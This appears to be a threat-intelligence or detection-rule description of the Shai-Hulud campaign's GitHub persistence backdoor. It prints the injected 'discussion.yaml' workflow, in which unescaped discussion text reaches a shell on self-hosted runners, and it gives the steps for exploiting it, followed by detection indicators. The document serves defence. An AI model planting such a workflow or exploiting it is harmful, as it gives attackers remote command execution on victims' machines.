  description: |
    The Shai-Hulud campaign establishes a persistent backdoor mechanism by
    registering compromised machines as GitHub self-hosted runners and injecting
    a malicious workflow that allows arbitrary command execution through GitHub
    Discussions.

    ## Attack Mechanism

    The malware performs two key actions to establish persistence:

    1. **Self-Hosted Runner Registration**: The payload registers the infected
       machine as a self-hosted runner named 'SHA1HULUD' on the victim's
       GitHub repository.

    2. **Workflow Injection**: A malicious workflow file named 
       `.github/workflows/discussion.yaml` is pushed to the repository via
       the GitHub API.

    ## Malicious Workflow Content

    The injected workflow contains a command injection vulnerability and
    runs specifically on self-hosted runners:

    ```yaml
    name: Discussion Create
    on:
      discussion:
    jobs:
      process:
        env:
          RUNNER_TRACKING_ID: 0
        runs-on: self-hosted
        steps:
          - uses: actions/checkout@v5
          - name: Handle Discussion
            run: echo ${{ github.event.discussion.body }}
    ```

    ## Exploitation Method

    The workflow triggers when a new discussion is created in the repository.
    Due to the injection vulnerability in the `echo` command, the attacker
    can execute arbitrary commands on the compromised self-hosted runner by:
    1. Creating a new discussion in the infected repository
    2. Including shell commands in the discussion body
    3. The workflow executes these commands on the self-hosted runner

    ## Persistence Implications

    Any public repository utilizing this workflow could still be used in the
    future to act as a backdoor to its associated infected machines. This
    provides long-term persistent access to the compromised environment even
    after the initial npm supply chain attack is discovered.

    ## Detection Indicators

    - Self-hosted runners named 'SHA1HULUD'
    - Workflow files named 'discussion.yaml' with discussion triggers
    - Workflows using `${{ github.event.discussion.body }}` in run commands
    - Unexpected workflow files pushed to repositories
